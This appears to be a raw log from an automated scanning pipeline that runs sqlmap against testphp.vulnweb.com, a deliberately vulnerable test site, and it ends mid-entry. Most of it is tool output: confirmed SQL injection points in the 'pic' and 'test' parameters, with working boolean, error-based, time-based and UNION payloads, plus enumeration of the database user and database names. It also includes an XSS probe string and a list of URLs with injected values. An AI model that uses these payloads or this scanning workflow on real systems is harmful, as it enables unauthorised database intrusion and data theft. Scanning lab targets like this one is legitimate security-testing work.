+[07:27:43] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com:80/comment.php?pid=4
+do you want to test this URL? [Y/n/q]
+> Y
+[07:27:43] [INFO] testing URL 'http://testphp.vulnweb.com:80/comment.php?pid=4'
+[07:27:43] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0727am.csv' as the CSV results file in multiple targets mode
+[07:27:43] [INFO] testing connection to the target URL
+[07:27:44] [CRITICAL] page not found (404)
+[07:27:44] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+[07:27:44] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0727am.csv'
+
+[*] ending @ 07:27:44 /2025-10-22/
+
+
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/listproducts.php?-=
+
+[SQLI - detect] http://testphp.vulnweb.com:80/product.php?pic=5
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 07:30:45 /2025-10-22/
+
+[07:30:45] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[07:30:45] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com:80/product.php?pic=5
+do you want to test this URL? [Y/n/q]
+> Y
+[07:30:45] [INFO] testing URL 'http://testphp.vulnweb.com:80/product.php?pic=5'
+[07:30:45] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0730am.csv' as the CSV results file in multiple targets mode
+[07:30:45] [INFO] testing connection to the target URL
+[07:30:45] [INFO] checking if the target is protected by some kind of WAF/IPS
+[07:30:46] [INFO] testing if the target URL content is stable
+[07:30:46] [INFO] target URL content is stable
+[07:30:46] [INFO] testing if GET parameter 'pic' is dynamic
+[07:30:46] [INFO] GET parameter 'pic' appears to be dynamic
+[07:30:47] [INFO] heuristic (basic) test shows that GET parameter 'pic' might be injectable (possible DBMS: 'MySQL')
+[07:30:47] [INFO] heuristic (XSS) test shows that GET parameter 'pic' might be vulnerable to cross-site scripting (XSS) attacks
+[07:30:47] [INFO] testing for SQL injection on GET parameter 'pic'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) and risk (2) values? [Y/n] Y
+[07:30:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[07:30:47] [WARNING] reflective value(s) found and filtering out
+[07:30:50] [INFO] GET parameter 'pic' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="cm")
+[07:30:50] [INFO] testing 'Generic inline queries'
+[07:30:50] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[07:30:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[07:30:50] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[07:30:51] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[07:30:51] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[07:30:51] [INFO] GET parameter 'pic' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[07:30:51] [INFO] testing 'MySQL inline queries'
+[07:30:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[07:30:52] [WARNING] time-based comparison requires larger statistical model, please wait......... (done)
+[07:30:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[07:30:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[07:30:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[07:30:55] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[07:30:56] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[07:30:56] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[07:31:07] [INFO] GET parameter 'pic' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[07:31:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[07:31:07] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[07:31:07] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[07:31:09] [INFO] target URL appears to have 11 columns in query
+[07:31:16] [INFO] GET parameter 'pic' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'pic' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
+---
+Parameter: pic (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pic=5 AND 9160=9160
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: pic=5 AND GTID_SUBSET(CONCAT(0x71627a7871,(SELECT (ELT(9838=9838,1))),0x71786a7071),9838)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: pic=5 AND (SELECT 3013 FROM (SELECT(SLEEP(5)))taGB)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: pic=-1594 UNION ALL SELECT NULL,NULL,CONCAT(0x71627a7871,0x6d4a616e6c67776d50547562584d516d7574524e6f4b726e466c425a596d6c4978594d564b456d51,0x71786a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[07:31:16] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+[07:31:18] [INFO] fetching current user
+current user: 'acuart@localhost'
+[07:31:19] [INFO] fetching database names
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+[07:31:19] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0730am.csv'
+
+[*] ending @ 07:31:19 /2025-10-22/
+
+
+
+[SQLI - dbs] http://testphp.vulnweb.com:80/product.php?pic=5
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 07:31:20 /2025-10-22/
+
+[07:31:20] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[07:31:20] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com:80/product.php?pic=5
+do you want to test this URL? [Y/n/q]
+> Y
+[07:31:20] [INFO] testing URL 'http://testphp.vulnweb.com:80/product.php?pic=5'
+[07:31:20] [INFO] resuming back-end DBMS 'mysql' 
+[07:31:20] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0731am.csv' as the CSV results file in multiple targets mode
+[07:31:20] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pic (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pic=5 AND 9160=9160
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: pic=5 AND GTID_SUBSET(CONCAT(0x71627a7871,(SELECT (ELT(9838=9838,1))),0x71786a7071),9838)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: pic=5 AND (SELECT 3013 FROM (SELECT(SLEEP(5)))taGB)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: pic=-1594 UNION ALL SELECT NULL,NULL,CONCAT(0x71627a7871,0x6d4a616e6c67776d50547562584d516d7574524e6f4b726e466c425a596d6c4978594d564b456d51,0x71786a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[07:31:20] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+[07:31:20] [INFO] fetching database names
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+[07:31:21] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0731am.csv'
+
+[*] ending @ 07:31:21 /2025-10-22/
+
+
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?12C1RD=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?jMRLQE=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?96ACWV=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?YsHWWF=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?ozhMaH=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/hpp/params.php?aaaa/="><script>alert(2)</script>
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?0oIRzv=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?drpK3W=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?NTeuRs=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?yEBpVY=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?lIDCx8=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?fL2RJE=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?2gxpZc=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/listproducts.php?asdf=ff
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?QKGb7Q=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?fGCsw8=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?775Rqe=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?XzX8BV=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?hm48eJ=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?WmVBjO=
+
+[SQLI - detect] http://testphp.vulnweb.com/redir.php?7FM1ee=
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:31:22 /2025-10-22/
+
+[08:31:22] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[08:31:22] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com/redir.php?7FM1ee=
+do you want to test this URL? [Y/n/q]
+> Y
+[08:31:22] [INFO] testing URL 'http://testphp.vulnweb.com/redir.php?7FM1ee='
+[08:31:22] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0831am.csv' as the CSV results file in multiple targets mode
+[08:31:22] [INFO] testing connection to the target URL
+[08:31:23] [INFO] testing if the target URL content is stable
+[08:31:23] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
+[08:31:23] [INFO] testing if GET parameter '7FM1ee' is dynamic
+[08:31:23] [WARNING] GET parameter '7FM1ee' does not appear to be dynamic
+[08:31:23] [WARNING] heuristic (basic) test shows that GET parameter '7FM1ee' might not be injectable
+[08:31:24] [INFO] testing for SQL injection on GET parameter '7FM1ee'
+[08:31:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[08:31:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[08:31:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[08:31:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[08:31:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[08:31:45] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[08:31:51] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[08:31:58] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[08:32:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[08:32:06] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[08:32:07] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[08:32:07] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[08:32:07] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[08:32:08] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[08:32:09] [CRITICAL] unable to connect to the target URL ('Connection refused')
+[08:32:09] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N] N
+[08:32:09] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0831am.csv'
+
+[*] ending @ 08:32:09 /2025-10-22/
+
+
+
+[SQLI - dbs] http://testphp.vulnweb.com/redir.php?7FM1ee=
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.9.10.5#dev}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:32:10 /2025-10-22/
+
+[08:32:10] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[08:32:10] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com/redir.php?7FM1ee=
+do you want to test this URL? [Y/n/q]
+> Y
+[08:32:10] [INFO] testing URL 'http://testphp.vulnweb.com/redir.php?7FM1ee='
+[08:32:10] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0832am.csv' as the CSV results file in multiple targets mode
+[08:32:10] [INFO] testing connection to the target URL
+[08:32:11] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
+[08:32:11] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with proxy switches ('--proxy', '--proxy-file'...)
+[08:32:11] [INFO] testing if the target URL content is stable
+[08:32:12] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[08:32:12] [CRITICAL] can't check dynamic content because of lack of page content
+[08:32:12] [INFO] testing if GET parameter '7FM1ee' is dynamic
+[08:32:12] [WARNING] GET parameter '7FM1ee' does not appear to be dynamic
+[08:32:12] [WARNING] heuristic (basic) test shows that GET parameter '7FM1ee' might not be injectable
+[08:32:13] [INFO] testing for SQL injection on GET parameter '7FM1ee'
+[08:32:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[08:32:14] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[08:32:14] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[08:32:16] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[08:32:17] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[08:32:18] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[08:32:20] [INFO] testing 'Generic inline queries'
+[08:32:20] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[08:32:21] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[08:32:23] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[08:32:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[08:32:25] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[08:32:27] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[08:32:28] [INFO] testing 'Oracle AND time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[08:32:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[08:32:33] [WARNING] GET parameter '7FM1ee' does not seem to be injectable
+[08:32:33] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next target
+[08:32:33] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0832am.csv'
+
+[*] ending @ 08:32:33 /2025-10-22/
+
+
+[GF+qsreplace] http://testphp.vulnweb.com/comment.php?aid=1A01
+http://testphp.vulnweb.com/comment.php?aid=PAYLOAD
+
+[GF+qsreplace] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1') AND 6311=6311 AND ('vgPb'='vgPb
+http://testphp.vulnweb.com/AJAX/infoartist.php?id=PAYLOAD
+
+[GF+qsreplace] http://testphp.vulnweb.com/??id=1') AND 6602=8784 AND ('awZN'='awZN
+http://testphp.vulnweb.com/?%3Fid=PAYLOAD
+
+[GF+qsreplace] http://testphp.vulnweb.com:80/comment.php?pid=4
+http://testphp.vulnweb.com:80/comment.php?pid=PAYLOAD
+
+[GF+qsreplace] http://testphp.vulnweb.com/redir.php?view=itemlist
+http://testphp.vulnweb.com/redir.php?view=PAYLOAD
+
+[GF+qsreplace] http://testphp.vulnweb.com/redir.php?UID=118121
+http://testphp.vulnweb.com/redir.php?UID=PAYLOAD
+
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?ljGoDh=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?HuIVZc=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?25e6ti=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?ctg2VL=
+
+[SQLI - detect] http://testphp.vulnweb.com/search.php?test=query=
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:44:34 /2025-10-22/
+
+[08:44:34] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[08:44:34] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com/search.php?test=query=
+do you want to test this URL? [Y/n/q]
+> Y
+[08:44:34] [INFO] testing URL 'http://testphp.vulnweb.com/search.php?test=query='
+[08:44:34] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0844am.csv' as the CSV results file in multiple targets mode
+[08:44:34] [INFO] testing connection to the target URL
+[08:44:34] [INFO] checking if the target is protected by some kind of WAF/IPS
+[08:44:35] [INFO] testing if the target URL content is stable
+[08:44:35] [INFO] target URL content is stable
+[08:44:35] [INFO] testing if GET parameter 'test' is dynamic
+[08:44:35] [WARNING] GET parameter 'test' does not appear to be dynamic
+[08:44:35] [INFO] heuristic (basic) test shows that GET parameter 'test' might be injectable (possible DBMS: 'MySQL')
+[08:44:36] [INFO] heuristic (XSS) test shows that GET parameter 'test' might be vulnerable to cross-site scripting (XSS) attacks
+[08:44:36] [INFO] testing for SQL injection on GET parameter 'test'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) and risk (2) values? [Y/n] Y
+[08:44:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[08:44:39] [WARNING] reflective value(s) found and filtering out
+[08:44:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[08:44:49] [INFO] GET parameter 'test' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --string="Our")
+[08:44:49] [INFO] testing 'Generic inline queries'
+[08:44:49] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[08:44:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[08:44:50] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[08:44:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[08:44:51] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[08:44:51] [INFO] GET parameter 'test' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[08:44:51] [INFO] testing 'MySQL inline queries'
+[08:44:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[08:44:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[08:44:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[08:44:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[08:44:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[08:44:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[08:44:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[08:45:01] [INFO] GET parameter 'test' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[08:45:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[08:45:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[08:45:08] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[08:45:08] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[08:45:09] [INFO] target URL appears to have 3 columns in query
+[08:45:10] [INFO] GET parameter 'test' is 'Generic UNION query (random number) - 1 to 20 columns' injectable
+GET parameter 'test' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 96 HTTP(s) requests:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: test=query=' AND 3503=(SELECT (CASE WHEN (3503=3503) THEN 3503 ELSE (SELECT 3069 UNION SELECT 2312) END))-- -
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: test=query=' AND GTID_SUBSET(CONCAT(0x71706a6a71,(SELECT (ELT(9731=9731,1))),0x7170626b71),9731)-- KNdA
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query=' AND (SELECT 6153 FROM (SELECT(SLEEP(5)))lvzW)-- OOBz
+
+    Type: UNION query
+    Title: Generic UNION query (random number) - 3 columns
+    Payload: test=query=' UNION ALL SELECT 7207,CONCAT(0x71706a6a71,0x685a685251615a434862594a5743485058686b42436c694b6a6947717a7a4a71497649564e746759,0x7170626b71),7207-- -
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:45:10] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
+[08:45:13] [INFO] fetching current user
+current user: 'acuart@localhost'
+[08:45:13] [INFO] fetching database names
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+[08:45:13] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0844am.csv'
+
+[*] ending @ 08:45:13 /2025-10-22/
+
+
+
+[SQLI - dbs] http://testphp.vulnweb.com/search.php?test=query=
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:45:14 /2025-10-22/
+
+[08:45:14] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[08:45:14] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com/search.php?test=query=
+do you want to test this URL? [Y/n/q]
+> Y
+[08:45:14] [INFO] testing URL 'http://testphp.vulnweb.com/search.php?test=query='
+[08:45:14] [INFO] resuming back-end DBMS 'mysql' 
+[08:45:14] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0845am.csv' as the CSV results file in multiple targets mode
+[08:45:14] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: test=query=' AND 3503=(SELECT (CASE WHEN (3503=3503) THEN 3503 ELSE (SELECT 3069 UNION SELECT 2312) END))-- -
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: test=query=' AND GTID_SUBSET(CONCAT(0x71706a6a71,(SELECT (ELT(9731=9731,1))),0x7170626b71),9731)-- KNdA
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query=' AND (SELECT 6153 FROM (SELECT(SLEEP(5)))lvzW)-- OOBz
+
+    Type: UNION query
+    Title: Generic UNION query (random number) - 3 columns
